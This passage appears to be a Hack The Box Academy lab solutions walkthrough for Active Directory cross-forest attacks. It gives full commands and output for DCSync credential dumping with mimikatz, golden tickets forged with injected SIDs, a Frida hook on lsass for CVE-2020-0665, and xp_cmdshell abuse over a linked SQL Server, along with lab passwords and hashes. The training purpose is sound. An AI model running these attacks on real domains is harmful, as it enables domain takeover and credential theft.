Students need to open PowerShell, navigate to `C:\Tools`, and import `PowerView.ps1` to get the security identifiers (SIDs) of the current domain (`inlanefreight.ad`) and the `Infrastructure` group in the `logistics.ad` domain, and note them down:

Code: powershell

```powershell
cd C:\Tools
Import-Module .\PowerView.ps1
Get-DomainSID
Get-ADGroup -Identity "Infrastructure" -Server "logistics.ad"
```

```
PS C:\Users\Administrator> cd C:\Tools
PS C:\Tools> Import-Module .\PowerView.ps1
PS C:\Tools> Get-DomainSID
S-1-5-21-2432454459-173448545-3375717855

PS C:\Tools> Get-ADGroup -Identity "Infrastructure" -Server "logistics.ad"

DistinguishedName : CN=Infrastructure,CN=Users,DC=logistics,DC=ad
GroupCategory     : Security
GroupScope        : Universal
Name              : Infrastructure
ObjectClass       : group
ObjectGUID        : fe42a45c-a42c-4945-98ca-57446ab9430a
SamAccountName    : Infrastructure
SID               : S-1-5-21-186204973-2882451676-2899969076-2602
```

Right after, they need to perform a DCSync attack targeting the `INLANEFREIGHT\krbtgt` account to gain its NTLM (rc4) hash using `mimikatz.exe`:

Code: powershell

```powershell
.\mimikatz.exe "lsadump::dcsync /user:INLANEFREIGHT\krbtgt /domain:inlanefreight.ad" exit
```

```
PS C:\Tools> .\mimikatz.exe "lsadump::dcsync /user:INLANEFREIGHT\krbtgt" exit

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY \`gentilkiwi\` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # lsadump::dcsync /user:INLANEFREIGHT\krbtgt
[DC] 'inlanefreight.ad' will be the domain
[DC] 'DC01.inlanefreight.ad' will be the DC server
[DC] 'INLANEFREIGHT\krbtgt' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 12/26/2023 8:38:43 AM
Object Security ID   : S-1-5-21-2432454459-173448545-3375717855-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 119885a9af438d1ef0d7543bed8b9ea1
    ntlm- 0: 119885a9af438d1ef0d7543bed8b9ea1
    lm  - 0: 6c3a4fff93ba201c4ae9735c68e93e47
    
<SNIP>
```

Consequently, students need to perform a golden ticket attack using `Rubeus.exe` while utilizing the hash of `krbtgt`, the SID of the domain, and the SID of the `Infrastructure` group attained earlier, importing the ticket into memory:

Code: powershell

```powershell
.\Rubeus.exe golden /rc4:119885a9af438d1ef0d7543bed8b9ea1 /domain:inlanefreight.ad /sid:S-1-5-21-2432454459-173448545-3375717855 /sids:S-1-5-21-186204973-2882451676-2899969076-2602 /user:jimmy /ptt
```

```
PS C:\Tools> .\Rubeus.exe golden /rc4:119885a9af438d1ef0d7543bed8b9ea1 /domain:inlanefreight.ad /sid:S-1-5-21-2432454459-173448545-3375717855 /sids:S-1-5-21-186204973-2882451676-2899969076-2602 /user:jim
my /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0

[*] Action: Build TGT

[*] Building PAC

[*] Domain         : INLANEFREIGHT.AD (INLANEFREIGHT)
[*] SID            : S-1-5-21-2432454459-173448545-3375717855
[*] UserId         : 500
[*] Groups         : 520,512,513,519,518
[*] ExtraSIDs      : S-1-5-21-186204973-2882451676-2899969076-2602
[*] ServiceKey     : 119885A9AF438D1EF0D7543BED8B9EA1
[*] ServiceKeyType : KERB_CHECKSUM_HMAC_MD5
[*] KDCKey         : 119885A9AF438D1EF0D7543BED8B9EA1
[*] KDCKeyType     : KERB_CHECKSUM_HMAC_MD5
[*] Service        : krbtgt
[*] Target         : inlanefreight.ad

[*] Generating EncTicketPart
[*] Signing PAC
[*] Encrypting EncTicketPart
[*] Generating Ticket
[*] Generated KERB-CRED
[*] Forged a TGT for 'jimmy@inlanefreight.ad'

[*] AuthTime       : 4/28/2024 10:21:44 AM
[*] StartTime      : 4/28/2024 10:21:44 AM
[*] EndTime        : 4/28/2024 8:21:44 PM
[*] RenewTill      : 5/5/2024 10:21:44 AM

[*] base64(ticket.kirbi):
doIFSzCCBUegAwIBBaEDAgEWooIERDCCBEBhggQ8MIIEOKADAgEFoRIbEElOTEFORUZSRUlHSFQuQUSi
<SNIP>
```

With the imported golden ticket, students can proceed to grab the flag from `DC02.logistics.ad`:

Code: powershell

```powershell
type \\DC02.logistics.ad\SID_Flag\flag.txt
```

```
PS C:\Tools> type \\DC02.logistics.ad\SID_Flag\flag.txt

HTB{S1d_H1StoRy_En@bl3D}
```

Answer: `HTB{S1d_H1StoRy_En@bl3D}`

# SID History Injection Attack

## Question 2

### "Enumerate Users with "SIDHistory" enabled and submit another user from the Inlanefreight domain that has been migrated from Logistics domain"

With the previously established RDP connection, students need to utilize `PowerView.ps1` to query the domain for other users that were migrated using the `Get-ADUser` cmdlet:

Code: powershell

```powershell
Get-ADUser -Filter "SIDHistory -Like '*'" -Properties SIDHistory
```

```
PS C:\Tools> Get-ADUser -Filter "SIDHistory -Like '*'" -Properties SIDHistory

<SNIP>

DistinguishedName : CN=james,CN=Users,DC=inlanefreight,DC=ad
Enabled           : True
GivenName         : james
Name              : james
ObjectClass       : user
ObjectGUID        : da11b047-27fa-4182-be0d-84aaf7a24c9c
SamAccountName    : james
SID               : S-1-5-21-2432454459-173448545-3375717855-4101
SIDHistory        : {S-1-5-21-186204973-2882451676-2899969076-2602}
Surname           :
UserPrincipalName : james@inlanefreight.ad
```

Answer: `james`

# SID Filter Bypass (CVE-2020-0665)

## Question 1

### "Authenticate to DC01.inlanefreight.ad (172.16.118.3) and perform the attack shown in the section to compromise SQL02. What is the flag value found at "\\\\SQL02.logistics.ad\\c$\\Users\\Administrator\\Desktop\\flag.txt"?"

After spawning the target students need to connect via SSH and establish a dynamic port forwarding with the credentials `Administrator:Test@123`:

Code: shell

```shell
ssh -D 9050 Administrator@STMIP
```

```
┌─[us-academy-3]─[10.10.14.195]─[htb-ac-8414@htb-uokxs66agi]─[~]
└──╼ [★]$ ssh -D 9050 Administrator@10.129.212.74

The authenticity of host '10.129.212.74 (10.129.212.74)' can't be established.
ECDSA key fingerprint is SHA256:ymhpv5dvyTmqO+Iq4zNh/Q4bdf6z9s9uA/ZofCP/fBs.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.212.74' (ECDSA) to the list of known hosts.
Administrator@10.129.212.74's password: 

Microsoft Windows [Version 10.0.14393]                                          
(c) 2016 Microsoft Corporation. All rights reserved.                            

administrator@SQL01 C:\Users\Administrator> 
```

Subsequently, they need to open a new terminal tab and clone locally the [forest-trust-tools](https://github.com/dirkjanm/forest-trust-tools) GitHub repository:

Code: shell

```shell
git clone https://github.com/dirkjanm/forest-trust-tools
```

```
┌─[us-academy-3]─[10.10.14.195]─[htb-ac-8414@htb-uokxs66agi]─[~]
└──╼ [★]$ git clone https://github.com/dirkjanm/forest-trust-tools

Cloning into 'forest-trust-tools'...
remote: Enumerating objects: 29, done.
remote: Counting objects: 100% (18/18), done.
remote: Compressing objects: 100% (13/13), done.
remote: Total 29 (delta 6), reused 14 (delta 5), pack-reused 11
Receiving objects: 100% (29/29), 23.71 KiB | 23.71 MiB/s, done.
Resolving deltas: 100% (8/8), done.
```

Right after, students need to utilize the `getlocalsid.py` python script from the cloned repository targeting the `SQL02.logistics.ad` computer using the credentials `Administrator:HTB_@cademy_adm!` and note down the SID from the output:

Code: shell

```shell
proxychains -q python forest-trust-tools/getlocalsid.py inlanefreight.ad/Administrator:'HTB_@cademy_adm!'@SQL02.logistics.ad SQL02
```

```
┌─[us-academy-3]─[10.10.14.195]─[htb-ac-8414@htb-uokxs66agi]─[~]
└──╼ [★]$ proxychains -q python forest-trust-tools/getlocalsid.py inlanefreight.ad/Administrator:'HTB_@cademy_adm!'@SQL02.logistics.ad SQL02

[*] Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

[*] Connecting to LSARPC named pipe at SQL02.logistics.ad
[*] Bind OK

Found local domain SID: S-1-5-21-2327345182-1863223493-3435513819
```

Consequently, they need to gather the SIDs for the `child.inlanefreight.ad` (`172.16.118.20`) subdomain and `inlanefreight.ad` (`172.16.118.3`) domain using `lookupsid.py` part of Impacket with the credentials `Administrator:HTB_@cademy_adm!`:

Code: shell

```shell
proxychains -q lookupsid.py inlanefreight.ad/Administrator:'HTB_@cademy_adm!'@172.16.118.20 | grep "Domain SID"
proxychains -q lookupsid.py inlanefreight.ad/Administrator:'HTB_@cademy_adm!'@172.16.118.3 | grep "Domain SID"
```

```
┌─[us-academy-3]─[10.10.14.195]─[htb-ac-8414@htb-uokxs66agi]─[~]
└──╼ [★]$ proxychains -q lookupsid.py inlanefreight.ad/Administrator:'HTB_@cademy_adm!'@172.16.118.20 | grep "Domain SID"

[*] Domain SID is: S-1-5-21-3878752286-62540090-653003637

┌─[us-academy-3]─[10.10.14.195]─[htb-ac-8414@htb-uokxs66agi]─[~]
└──╼ [★]$ proxychains -q lookupsid.py inlanefreight.ad/Administrator:'HTB_@cademy_adm!'@172.16.118.3 | grep "Domain SID"

[*] Domain SID is: S-1-5-21-2432454459-173448545-3375717855
```

Subsequently, students need to use the Python code from the `Convert SID` portion of the section and convert the `S-1-5-21-3878752286-62540090-653003637` and `S-1-5-21-2327345182-1863223493-3435513819` to their binary representations.

Code: python

```python
input_string = 'S-1-5-21-3878752286-62540090-653003637'
input_string2 = 'S-1-5-21-2327345182-1863223493-3435513819'
prefix = 'S-1-5-21-'

# Split the input string after the constant prefix
components = input_string.split(prefix, 1)
if len(components) > 1:
    remaining_string = components[1]
    split_values = remaining_string.split('-')
    output_list = []
    for i in split_values:
        decimal_number = int(i)
        hexadecimal_value = hex(decimal_number)[2:].zfill(8)
        little = ' '.join([hexadecimal_value[i:i+2] for i in range(len(hexadecimal_value)-2, -2, -2)])
        bytes_list = little.split()
        formatted_bytes = ', '.join([f"0x{byte.upper()}" for byte in bytes_list]) 
        output_list.append(formatted_bytes)
    final_output = ', '.join(output_list)
    print("[*] child.inlanfreight.ad SID: \n 0x01, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x05, 0x15, 0x00, 0x00, 0x00, " + final_output)

components2 = input_string2.split(prefix, 1)
if len(components2) > 1:
    remaining_string = components2[1]
    split_values2 = remaining_string.split('-')
    output_list2 = []
    for i in split_values2:
        decimal_number2 = int(i)
        hexadecimal_value2 = hex(decimal_number2)[2:].zfill(8)
        little2 = ' '.join([hexadecimal_value2[i:i+2] for i in range(len(hexadecimal_value2)-2, -2, -2)])
        bytes_list2 = little2.split()
        formatted_bytes2 = ', '.join([f"0x{byte.upper()}" for byte in bytes_list2]) 
        output_list2.append(formatted_bytes2)
    final_output2 = ', '.join(output_list2)
    print("\n[*] inlanefreight.ad SID: \n 0x01, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x05, 0x15, 0x00, 0x00, 0x00, " + final_output2)
```

```
┌─[us-academy-3]─[10.10.14.195]─[htb-ac-8414@htb-uokxs66agi]─[~]
└──╼ [★]$ python3 convert-sid.py 

[*] child.inlanfreight.ad SID: 
 0x01, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x05, 0x15, 0x00, 0x00, 0x00, 0x1E, 0x10, 0x31, 0xE7, 0x3A, 0x49, 0xBA, 0x03, 0x75, 0x0B, 0xEC, 0x26

[*] inlanefreight.ad SID: 
 0x01, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x05, 0x15, 0x00, 0x00, 0x00, 0x1E, 0x78, 0xB8, 0x8A, 0xC5, 0x88, 0x0E, 0x6F, 0xDB, 0xC7, 0xC5, 0xCC
```

Students need to establish an RDP connection to `DC01.inlanefreight.ad` (`172.16.118.3`) using the credentials `Administrator:HTB_@cademy_adm!`:

Code: shell

```shell
proxychains -q xfreerdp /v:172.16.118.3 /u:Administrator /p:'HTB_@cademy_adm!' /dynamic-resolution
```

```
┌─[us-academy-3]─[10.10.14.195]─[htb-ac-8414@htb-uokxs66agi]─[~]
└──╼ [★]$ proxychains -q xfreerdp /v:172.16.118.3 /u:Administrator /p:'HTB_@cademy_adm!' /dynamic-resolution

[07:46:07:758] [3807:3809] [INFO][com.freerdp.crypto] - creating directory /home/htb-ac-8414/.config/freerdp
[07:46:07:758] [3807:3809] [INFO][com.freerdp.crypto] - creating directory [/home/htb-ac-8414/.config/freerdp/certs]
[07:46:07:758] [3807:3809] [INFO][com.freerdp.crypto] - created directory [/home/htb-ac-8414/.config/freerdp/server]
[07:46:07:940] [3807:3809] [WARN][com.freerdp.crypto] - Certificate verification failure 'self signed certificate (18)' at stack position 0
[07:46:07:940] [3807:3809] [WARN][com.freerdp.crypto] - CN = DC01.inlanefreight.ad
[07:46:07:940] [3807:3809] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[07:46:07:940] [3807:3809] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[07:46:07:940] [3807:3809] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[07:46:07:940] [3807:3809] [ERROR][com.freerdp.crypto] - The hostname used for this connection (172.16.118.3:3389) 
[07:46:07:940] [3807:3809] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[07:46:07:940] [3807:3809] [ERROR][com.freerdp.crypto] - Common Name (CN):
[07:46:07:940] [3807:3809] [ERROR][com.freerdp.crypto] - 	DC01.inlanefreight.ad
[07:46:07:940] [3807:3809] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 172.16.118.3:3389 (RDP-Server):
	Common Name: DC01.inlanefreight.ad
	Subject:     CN = DC01.inlanefreight.ad
	Issuer:      CN = DC01.inlanefreight.ad
	Thumbprint:  4f:08:98:37:cd:0c:b7:af:7e:30:a9:82:b8:21:29:e1:eb:a1:fb:85:7a:ea:50:76:da:fe:d5:d1:9b:b7:c7:b0
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

They need to open `PowerShell`, navigate to `C:\Tools`, and utilize LDAP filters querying the domain for the `objectguid` of `logistics.ad`, subsequently students need to use `mimikatz.exe` and perform a DCSync attack using the `/guid` option and specifying the GUID of the `logistics.ad` domain to gain the `aes256_hmac` and `rc4` password hashes:

Code: powershell

```powershell
cd C:\Tools
Get-ADObject -LDAPFilter '(objectClass=trustedDomain)' | select name,objectguid
.\mimikatz.exe "lsadump::dcsync /guid:{8d52f9da-361b-4dc3-8fa7-af5f282fa741}" "exit"
```

```
PS C:\Users\Administrator> cd C:\Tools
PS C:\Tools> Get-ADObject -LDAPFilter '(objectClass=trustedDomain)' | select name,objectguid

name                   objectguid
----                   ----------
logistics.ad           8d52f9da-361b-4dc3-8fa7-af5f282fa741
child.inlanefreight.ad 44591edf-66d2-4d8c-8125-facb7fb3c643

PS C:\Tools> .\mimikatz.exe "lsadump::dcsync /guid:{8d52f9da-361b-4dc3-8fa7-af5f282fa741}" "exit"

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY \`gentilkiwi\` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # lsadump::dcsync /guid:{8d52f9da-361b-4dc3-8fa7-af5f282fa741}
[DC] 'inlanefreight.ad' will be the domain
[DC] 'DC01.inlanefreight.ad' will be the DC server
[DC] Object with GUID '{8d52f9da-361b-4dc3-8fa7-af5f282fa741}'
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : logistics.ad

** TRUSTED DOMAIN - Antisocial **

Partner              : logistics.ad
 [  In ] INLANEFREIGHT.AD -> LOGISTICS.AD
    * 4/28/2024 11:47:19 PM - CLEAR   - 0e 8a d1 09 a9 5c d8 9b fc 4d 43 97 c8 17 35 e4 90 80 ed 4e 27 07 77 29 05 38 53
 b4 8b 02 37 d8 35 34 81 1c 36 4a 94 5e 7e 78 41 10 1d c4 5c 1a d9 39 d0 6b 3e 6a 91 42 ce d9 b4 51 df 7a 11 e1 12 af c6
 10 f0 a2 66 d2 7d 4a d9 12 5d 2a 88 74 a4 ff f4 14 42 28 c7 85 99 8c 0a a3 b3 a2 bd 7c 55 c0 3f 93 b2 89 04 e9 70 86 28
 83 9f 50 fa 53 82 bd b8 a2 cc d6 6a 38 9b b6 fc 6f cb 06 57 50 00 90 19 69 6b d6 5d 44 a3 2a 93 0e 1b 53 dd 6e 64 84 2a
 68 a3 97 95 9d d7 cc 0c cd d3 57 0d 0e 8a 12 3a eb 6b dc 33 b6 ea 27 ed 28 23 77 b8 c7 e3 ff c0 85 1f 41 3c aa ba bc fb
 98 db c0 1e a4 92 58 33 39 6c dc e5 55 37 a1 7c 6a 5c 63 63 ce 8e fe 75 ba 71 43 6f 4f 0d 5a 9b 8d 22 4a 47 8c fd 7f 80
 0f 9b ef 9e fc 32 56 cd 66 39 c6 9d eb
        * aes256_hmac       2d187055e4cb142db30db9919b331c324e230b2d1c5a388a3ee0a05bb96f8fbe
        * aes128_hmac       5b0e444248ba06c9a786ce52a695de3f
        * rc4_hmac_nt       e5a21fa9309b5d81095767ca6b1e4ce3
<SNIP>
```

Consequently, they need to open `frida_intercept.py` using `notepad` and alter the variables `buf1` and `newsid` with the previously converted SIDs into binary using `convert-sid.py` and save the changes.

Code: powershell

```powershell
notepad .\frida_intercept.py
```

Code: powershell

```powershell
PS C:\Tools> notepad .\frida_intercept.py
```

![[HTB Solutions/CPTS/z. images/1aa10a1e56fd9653e2eb5e3a68ec0099_MD5.jpg]]

Students need to utilize `PsExec64.exe` to spawn an elevated session as `SYSTEM` and run `frida_intercept.py` targeting `lsass.exe`:

Code: powershell

```powershell
.\PsExec64.exe -accepteula -s -i powershell
cd C:\Tools
python .\frida_intercept.py lsass.exe
```

Code: powershell

```powershell
PS C:\Tools> .\PsExec64.exe -accepteula -s -i powershell

PsExec v2.43 - Execute processes remotely
Copyright (C) 2001-2023 Mark Russinovich
Sysinternals - www.sysinternals.com

PS C:\Windows\system32> cd C:\Tools
PS C:\Tools> python .\frida_intercept.py lsass.exe

lsadb.dll baseAddr: 0x7ffbb2f00000
[!] Ctrl+D on UNIX, Ctrl+Z on Windows/cmd.exe to detach from instrumented program.
```

Subsequently, students need to use their Linux workstations to query the trust information using `gettrustinfo.py` part of the `forest-trust-tools` using the `DC01` machine account:

Code: shell

```shell
proxychains -q python gettrustinfo.py inlanefreight.ad/logistics.ad@DC01 -hashes :c586031a224f252a7c8a31a6d2210cc1 -target 172.16.118.3
```

```
┌─[us-academy-3]─[10.10.14.195]─[htb-ac-8414@htb-uokxs66agi]─[~]
└──╼ [★]$ proxychains -q python forest-trust-tools/gettrustinfo.py inlanefreight.ad/logistics.ad@DC01 -hashes :c586031a224f252a7c8a31a6d2210cc1 -target 172.16.118.3

Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

[*] StringBinding ncacn_ip_tcp:172.16.118.3[49672]
NetrGetForestTrustInformationResponse 
ReturnAuthenticator:            
    Credential:                     
        Data:                            b'+Z\x8b\x83\x87\xf1\xcf!' 
    Timestamp:                       0 
ForestTrustInfo:                
    RecordCount:                     3 
    Entries:                        
        [
             
            Flags:                           0 
            ForestTrustType:                 ForestTrustTopLevelName 
            Time:                            0 
            ForestTrustData:                
                tag:                             0 
                TopLevelName:                    'inlanefreight.ad' ,
             
            Flags:                           0 
            ForestTrustType:                 ForestTrustDomainInfo
<SNIP>
```

They will notice that by doing the query they have also intercepted and altered the SIDs:

Code: powershell

```powershell
PS C:\Tools> python .\frida_intercept.py lsass.exe

lsadb.dll baseAddr: 0x7ffbb2f00000
[!] Ctrl+D on UNIX, Ctrl+Z on Windows/cmd.exe to detach from instrumented prog
m.

entering intercepted function will return to r2 0x7ffbb2f151dc
              0  1  2  3  4  5  6  7  8  9  A  B  C  D  E  F  0123456789ABCDEF
2043523a4a8  01 04 00 00 00 00 00 05 15 00 00 00 1e 10 31 e7  ..............1.
2043523a4b8  3a 49 ba 03 75 0b ec 26                          :I..u..&
sid matches!
modified SID in response
entering intercepted function will return to r2 0x7ffbb2f151dc

<SNIP>
```

Students will terminate `frida_intercept.py` with `CTRL + Z` and `Enter` and close the terminal. Subsequently, they will need to use `mimikatz.exe` to request a golden ticket that will be saved on disk:

Code: powershell

```powershell
.\mimikatz.exe "kerberos::golden /domain:inlanefreight.ad /sid:S-1-5-21-2432454459-173448545-3375717855 /user:user1 /target:logistics.ad /service:krbtgt /sids:S-1-5-21-2327345182-1863223493-3435513819-500 /aes256:179e4ae68e627e1fd4014c87854e7f60b0c807eddbcaf6136ddf9d15a6d87ad8" exit
```

```
PS C:\Tools> .\mimikatz.exe "kerberos::golden /domain:inlanefreight.ad /sid:S-1-5-21-2432454459-173448545-3375717855 /user:user1 /target:logistics.ad /service:krbtgt /sids:S-1-5-21-2327345182-1863223493-3435513819-500 /aes256:179e4ae68e627e1fd4014c87854e7f60b0c807eddbcaf6136ddf9d15a6d87ad8" exit

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY \`gentilkiwi\` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # kerberos::golden /domain:inlanefreight.ad /sid:S-1-5-21-2432454459-173448545-3375717855 /user:us
er1 /target:logistics.ad /service:krbtgt /sids:S-1-5-21-2327345182-1863223493-3435513819-500 /aes256:179e4ae68e627e1fd40
14c87854e7f60b0c807eddbcaf6136ddf9d15a6d87ad8
User      : user1
Domain    : inlanefreight.ad (INLANEFREIGHT)
SID       : S-1-5-21-2432454459-173448545-3375717855
User Id   : 500
Groups Id : *513 512 520 518 519
Extra SIDs: S-1-5-21-2327345182-1863223493-3435513819-500 ;
ServiceKey: 179e4ae68e627e1fd4014c87854e7f60b0c807eddbcaf6136ddf9d15a6d87ad8 - aes256_hmac
Service   : krbtgt
Target    : logistics.ad
Lifetime  : 4/29/2024 12:25:12 AM ; 4/27/2034 12:25:12 AM ; 4/27/2034 12:25:12 AM
-> Ticket : ticket.kirbi

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Final Ticket Saved to file !

mimikatz(commandline) # exit
Bye!
```

With the saved ticket on disk, they will proceed to request a ticket-granting service ticket using `kekeo.exe` targeting the `cifs` protocol of `SQL02.logistics.ad` and choosing the `DC02.logistics.ad` KDC host to import the ticket into memory:

Code: powershell

```powershell
.\kekeo.exe "tgs::ask /tgt:ticket.kirbi /service:cifs/SQL02.logistics.ad@LOGISTICS.AD /kdc:DC02.logistics.ad /ptt" exit
```

```
PS C:\Tools> .\kekeo.exe "tgs::ask /tgt:ticket.kirbi /service:cifs/SQL02.logistics.ad@LOGISTICS.AD /kdc:DC02.logistics.ad /ptt" exit

  ___ _    kekeo 2.1 (x64) built on Dec 14 2021 11:51:55
 /   ('>-  "A La Vie, A L'Amour"
 | K  |    /* * *
 \____/     Benjamin DELPY \`gentilkiwi\` ( benjamin@gentilkiwi.com )
  L\_       https://blog.gentilkiwi.com/kekeo                (oe.eo)
                                             with 10 modules * * */

kekeo(commandline) # tgs::ask /tgt:ticket.kirbi /service:cifs/SQL02.logistics.ad@LOGISTICS.AD /kdc:DC02.logistics.ad /ptt
Ticket  : ticket.kirbi
  [krb-cred]     S: krbtgt/logistics.ad @ inlanefreight.ad
  [krb-cred]     E: [00000012] aes256_hmac
  [enc-krb-cred] P: user1 @ inlanefreight.ad
  [enc-krb-cred] S: krbtgt/logistics.ad @ inlanefreight.ad
  [enc-krb-cred] T: [4/29/2024 12:25:12 AM ; 4/27/2034 12:25:12 AM] {R:4/27/2034 12:25:12 AM}
  [enc-krb-cred] F: [40a00000] pre_authent ; renewable ; forwardable ;
  [enc-krb-cred] K: ENCRYPTION KEY 18 (aes256_hmac      ): afa362c54dd33f7ff67a84f95c6334e57853386479db52dc58eb9bad6efcf5fa
[kdc] name: DC02.logistics.ad
Service(s):
  cifs/SQL02.logistics.ad @ LOGISTICS.AD
 > cifs/SQL02.logistics.ad : OK!

kekeo(commandline) # exit
Bye!
```

Students can proceed to grab the flag:

Code: powershell

```powershell
type \\SQL02.logistics.ad\c$\Users\Administrator\Desktop\flag.txt
```

```
PS C:\Tools> type \\SQL02.logistics.ad\c$\Users\Administrator\Desktop\flag.txt

HTB{CVE_2020_0665_FTW}
```

Answer: `HTB{CVE_2020_0665_FTW}`

# Abusing SQL Server Links

## Question 1

### "Perform the attack shown in the section to compromsie SQL02. What is the flag value found at "\\\\SQL02.logistics.ad\\c$\\flag\\flag.txt"?"

After spawning the target students will have to connect to the MSSQL service using `mssqlclient.py` using the credentials `jimmy:Password123` while specifying the `-windows-auth` option forcing an NTLM authentication:

Code: shell

```shell
mssqlclient.py jimmy:'Password123'@STMIP -windows-auth
```

```
┌─[us-academy-3]─[10.10.14.195]─[htb-ac-8414@htb-f7uzn6hnv2]─[~]
└──╼ [★]$ mssqlclient.py jimmy:'Password123'@10.129.229.204 -windows-auth

Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(SQL01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(SQL01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (inlanefreight\jimmy  guest@master)>
```

Subsequently, they need to enumerate the links present in the MSSQL service using the `enum_links` command:

Code: shell

```shell
enum_links
```

```
SQL (inlanefreight\jimmy  guest@master)> enum_links
SRV_NAME           SRV_PROVIDERNAME   SRV_PRODUCT   SRV_DATASOURCE     SRV_PROVIDERSTRING   SRV_LOCATION   SRV_CAT   
----------------   ----------------   -----------   ----------------   ------------------   ------------   -------   
SQL01\SQLEXPRESS   SQLNCLI            SQL Server    SQL01\SQLEXPRESS   NULL                 NULL           NULL      

SQL02\SQLEXPRESS   SQLNCLI            SQL Server    SQL02\SQLEXPRESS   NULL                 NULL           NULL      

Linked Server      Local Login           Is Self Mapping   Remote Login   
----------------   -------------------   ---------------   ------------   
SQL02\SQLEXPRESS   inlanefreight\jimmy                 0   sa
```

Having acquired the knowledge that the user `inlanefreight\jimmy` has sysadmin access on the `SQL02\SQLEXPRESS` linked server students will have to use the `use_link` command to switch to the linked server and consequently enable `xp_cmdshell`:

Code: shell

```shell
use_link "SQL02\SQLEXPRESS"
enable_xp_cmdshell
```

```
SQL (inlanefreight\jimmy  guest@master)> use_link "SQL02\SQLEXPRESS"

SQL >"SQL02\SQLEXPRESS" (sa  dbo@master)> enable_xp_cmdshell

[*] INFO(SQL02\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
[*] INFO(SQL02\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
```

Right after, they can utilize the `xp_cmdshell` command to grab the flag.

Code: shell

```shell
xp_cmdshell "type \\SQL02.logistics.ad\c$\flag\flag.txt"
```

```
SQL >"SQL02\SQLEXPRESS" (sa  dbo@master)> xp_cmdshell "type \\SQL02.logistics.ad\c$\flag\flag.txt"

output                  
---------------------   
HTB{SQL_SERV3R_ABUS3}
```

Alternatively, students can use `OPENROWSET` to read the contents of a file using the `BULK` rowset provider without the need to enable `xp_cmdshell`.

Code: shell

```shell
SELECT * FROM OPENROWSET(BULK N'C:/flag/flag.txt', SINGLE_CLOB) AS Contents
```

```
SQL >"SQL02\SQLEXPRESS" (sa  dbo@master)> SELECT * FROM OPENROWSET(BULK N'C:/flag/flag.txt', SINGLE_CLOB) AS Contents

BulkColumn                 
------------------------   
b'HTB{SQL_SERV3R_ABUS3}' 
```

Answer: `HTB{SQL_SERV3R_ABUS3}`

# Abusing Foreign Security Principals & ACLs

## Question 1

### "Authenticate to DC01.inlanefreight.ad (172.16.118.3) and abuse the Foreign Group membership of the user "harry". What is the flag value located at "\\\\DC02.logistics.ad\\FSP\_Flag\\flag.txt"? (The flag is accessible by the "logistics\\svc\_admins" group)"

